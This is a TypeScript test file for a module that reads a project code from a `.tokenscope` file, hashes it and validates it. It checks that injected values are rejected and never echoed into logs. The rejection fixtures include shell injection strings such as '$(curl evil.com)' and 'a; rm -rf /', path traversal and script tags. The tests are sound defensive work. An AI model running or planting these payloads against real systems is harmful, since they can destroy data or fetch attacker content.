/*
 * tokenscope-project — the extracted client-neutral resolver/hasher (P0-2).
 *
 * Pins the four functions both clients (Claude + Copilot) MUST agree on so an
 * identical `.tokenscope` derives the SAME project.code_hash:
 *   - findTokenscopeFile / parseTokenscope  (walk-up + tiny-YAML)
 *   - computeCodeHash                         (sha256 hex == server)
 *   - resolveRepoProjectCode                  (arg or committed file → code)
 *
 * A BARE one-line `.tokenscope` (what the MCP `project` prompt used to write) is read as
 * the code since #485: repos tagged that way had been silently untagged. It gets
 * the same SAFE_PROJECT_CODE check as the YAML form.
 *
 * Cross-module identity: re-exports through tokenscope-reader.mjs and tag-repo.mjs
 * MUST resolve to the SAME functions (no accidental duplication after extraction).
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createHash } from 'node:crypto'
// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-ignore — mjs import resolved by Vitest
import {
  findTokenscopeFile, parseTokenscope, computeCodeHash, resolveRepoProjectCode, isSafeProjectCode,
} from '../../../plugin/scripts/tokenscope-project.mjs'
// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-ignore
import * as reader from '../../../plugin/scripts/tokenscope-reader.mjs'
// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-ignore
import * as tagRepo from '../../../plugin/scripts/tag-repo.mjs'
import { SKILL_PROJECT } from '../../../server/utils/skill-prompts.gen'

let dir: string
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'ts-project-')) })
afterEach(() => { rmSync(dir, { recursive: true, force: true }) })

describe('computeCodeHash', () => {
  it('is sha256(code) plain hex (matches the server derivation)', () => {
    const code = 'TokenScope-MVP'
    expect(computeCodeHash(code)).toBe(createHash('sha256').update(code).digest('hex'))
  })
})

describe('parseTokenscope — YAML project block (matches the skill-written form)', () => {
  it('reads code from an indented `code:` under `project:`', () => {
    const p = join(dir, '.tokenscope')
    writeFileSync(p, '# TokenScope\nproject:\n  code: TokenScope-MVP\n')
    expect(parseTokenscope(p).project.code).toBe('TokenScope-MVP')
  })

  it('#485: a bare one-liner (what the MCP project prompt used to write) is still the code', () => {
    const p = join(dir, '.tokenscope')
    writeFileSync(p, 'TokenScope-MVP\n')
    expect(parseTokenscope(p).project.code).toBe('TokenScope-MVP')
    writeFileSync(p, '# tagged by TokenScope\r\n1000012345/450000001\r\n')
    expect(parseTokenscope(p).project.code).toBe('1000012345/450000001')
  })

  it('a one-liner that is not a safe code, or not alone, is no code', () => {
    const p = join(dir, '.tokenscope')
    for (const text of ['https://attacker.example.com/bearer\n', 'two words\n', 'A-1\nB-2\n', 'client: Acme\n']) {
      writeFileSync(p, text)
      expect(parseTokenscope(p).project.code, text).toBeUndefined()
    }
  })
})

describe('#485: the MCP `project` prompt writes a file this parser reads', () => {
  // The prompt as SERVED (the generated twin of docs/skills/tokenscope/project.md,
  // which ships publicly where the markdown does not). Every fenced block that
  // carries a concrete `code:` line is a worked example the agent copies verbatim.
  const examples = [...SKILL_PROJECT.matchAll(/```[^\n]*\n([\s\S]*?)```/g)]
    .map((m) => m[1])
    .filter((block) => /^\s+code:\s*[A-Za-z0-9]/m.test(block))

  it('has at least one worked example, in the YAML project: form', () => {
    expect(examples.length).toBeGreaterThan(0)
    for (const block of examples) expect(block).toMatch(/^project:\s*$/m)
  })

  it.each(examples.map((b, i) => [i, b]))('example %i parses to its project code', (_i, block) => {
    const expected = /^\s+code:\s*(\S+)\s*$/m.exec(block as string)![1]
    const p = join(dir, '.tokenscope')
    writeFileSync(p, block as string)
    expect(parseTokenscope(p).project.code).toBe(expected)
    expect(resolveRepoProjectCode({ cwd: dir })).toMatchObject({ code: expected, source: 'tokenscope' })
  })
})

describe('resolveRepoProjectCode', () => {
  it('prefers an explicit arg (trimmed)', () => {
    expect(resolveRepoProjectCode({ arg: '  ABC ', cwd: dir })).toEqual({
      code: 'ABC', source: 'arg', tokenscopePath: null,
    })
  })

  it('resolves from a committed YAML .tokenscope walked up from cwd', () => {
    writeFileSync(join(dir, '.tokenscope'), 'project:\n  code: NWB-CIB\n')
    const nested = join(dir, 'a', 'b')
    mkdirSync(nested, { recursive: true })
    const r = resolveRepoProjectCode({ arg: '', cwd: nested })
    expect(r.code).toBe('NWB-CIB')
    expect(r.source).toBe('tokenscope')
    expect(r.tokenscopePath).toBe(join(dir, '.tokenscope'))
  })

  it('resolves a bare one-liner .tokenscope (#485)', () => {
    writeFileSync(join(dir, '.tokenscope'), 'TokenScope-MVP\n')
    expect(resolveRepoProjectCode({ arg: '', cwd: dir })).toMatchObject({ code: 'TokenScope-MVP', source: 'tokenscope' })
  })

  it('throws when no .tokenscope exists above cwd', () => {
    expect(() => resolveRepoProjectCode({ arg: '', cwd: dir })).toThrow(/Could not resolve/)
  })

  it('distinguishes a PRESENT-but-unsafe project.code from a missing one, without echoing it', () => {
    // "add one" is useless advice to someone who already added one, and the two
    // states need different fixes. Conflating them makes a silently-untagged
    // repo hard to diagnose, which on this project means spend spilling to the
    // untagged worklist with no error.
    // Single-line on purpose: a value carrying a newline never survives the
    // parse, so it reaches the genuinely-absent branch and would not exercise
    // this distinction at all.
    const hostile = 'https://attacker.example.com/bearer'
    writeFileSync(join(dir, '.tokenscope'), `project:\n  code: "${hostile}"\n`)
    let msg = ''
    try {
      resolveRepoProjectCode({ arg: '', cwd: dir })
    } catch (e) {
      msg = e instanceof Error ? e.message : String(e)
    }
    expect(msg).toMatch(/not usable as a project code/)
    expect(msg).not.toMatch(/no project\.code/) // must NOT claim it is missing
    // The value is repo-controlled and this message reaches a log — state the
    // rule, never the rejected bytes.
    expect(msg).not.toContain('attacker.example.com')
  })
})

describe('isSafeProjectCode / S1 fix 5 — parse-boundary charset validation', () => {
  it('accepts the real dogfood code (digits and a slash — README.md example)', () => {
    expect(isSafeProjectCode('1000012345/450000001')).toBe(true)
  })

  it('accepts ordinary alphanumeric-with-hyphen/underscore/dot codes', () => {
    for (const code of ['TokenScope-MVP', 'NWB-CIB', 'ABC', 'foo_bar.baz', 'a'.repeat(64)]) {
      expect(isSafeProjectCode(code)).toBe(true)
    }
  })

  it('rejects hostile values: newline/backtick/dollar/semicolon/quote/whitespace injection', () => {
    for (const code of [
      'evil\ncode',
      '`rm -rf /`',
      '$(curl evil.com)',
      'a; rm -rf /',
      '"quoted"',
      "'single'",
      'has space',
      '<script>alert(1)</script>',
      '../../etc/passwd',
      '',
      '   ',
    ]) {
      expect(isSafeProjectCode(code)).toBe(false)
    }
  })

  it('rejects a value not starting with an alphanumeric (e.g. a leading -, /, or .)', () => {
    expect(isSafeProjectCode('-flag')).toBe(false)
    expect(isSafeProjectCode('/abs/path')).toBe(false)
    expect(isSafeProjectCode('.hidden')).toBe(false)
  })

  it('rejects a value over 64 characters', () => {
    expect(isSafeProjectCode('a'.repeat(65))).toBe(false)
  })

  it('rejects non-string input', () => {
    expect(isSafeProjectCode(null)).toBe(false)
    expect(isSafeProjectCode(undefined)).toBe(false)
    expect(isSafeProjectCode(123)).toBe(false)
  })
})

describe('resolveRepoProjectCode — S1 fix 5: a hostile .tokenscope code is treated as no-tag, not carried forward', () => {
  it('accepts the real dogfood code end-to-end (.tokenscope → resolveRepoProjectCode)', () => {
    writeFileSync(join(dir, '.tokenscope'), 'project:\n  code: 1000012345/450000001\n')
    const r = resolveRepoProjectCode({ arg: '', cwd: dir })
    expect(r.code).toBe('1000012345/450000001')
    expect(r.source).toBe('tokenscope')
  })

  it('a hostile .tokenscope code is REJECTED and never carried forward (and is not echoed back)', () => {
    // The invariant is that the value is never USED, not that the message
    // matches the absent-file case. Wording them identically was incidental and
    // told a developer with a mistyped code to "add one" they had already
    // added; the rejection below is the part that matters.
    writeFileSync(join(dir, '.tokenscope'), 'project:\n  code: "$(curl evil.com)"\n')
    expect(() => resolveRepoProjectCode({ arg: '', cwd: dir })).toThrow(/not usable as a project code/)
    let msg = ''
    try { resolveRepoProjectCode({ arg: '', cwd: dir }) } catch (e) { msg = e instanceof Error ? e.message : String(e) }
    expect(msg).not.toContain('curl')
    expect(msg).not.toContain('evil.com')
  })

  it('a .tokenscope code with an embedded newline-injection attempt (via a quoted value) is rejected', () => {
    // parseTokenscope strips a trailing comment and quotes; a value that
    // SURVIVES parsing but fails the charset (e.g. shell metacharacters) must
    // still be rejected here.
    writeFileSync(join(dir, '.tokenscope'), 'project:\n  code: "evil;rm -rf /"\n')
    expect(() => resolveRepoProjectCode({ arg: '', cwd: dir })).toThrow(/not usable as a project code/)
    let msg = ''
    try { resolveRepoProjectCode({ arg: '', cwd: dir }) } catch (e) { msg = e instanceof Error ? e.message : String(e) }
    expect(msg).not.toContain('rm -rf') // rejected, and never echoed into a log
  })

  it('an explicit arg is NOT charset-constrained (never repo-controlled)', () => {
    // arg is only ever a server-validated code the user picked (project MCP
    // prompt) or '' (every hook-context caller) — it is deliberately not
    // subject to the .tokenscope parse-boundary charset.
    const r = resolveRepoProjectCode({ arg: 'Some Code With Spaces', cwd: dir })
    expect(r.code).toBe('Some Code With Spaces')
    expect(r.source).toBe('arg')
  })
})

describe('extraction identity — no accidental duplication', () => {
  it('tokenscope-reader.mjs re-exports the SAME find/parse functions', () => {
    expect(reader.findTokenscopeFile).toBe(findTokenscopeFile)
    expect(reader.parseTokenscope).toBe(parseTokenscope)
  })

  it('tag-repo.mjs re-exports the SAME computeCodeHash/resolveRepoProjectCode', () => {
    expect(tagRepo.computeCodeHash).toBe(computeCodeHash)
    expect(tagRepo.resolveRepoProjectCode).toBe(resolveRepoProjectCode)
  })
})
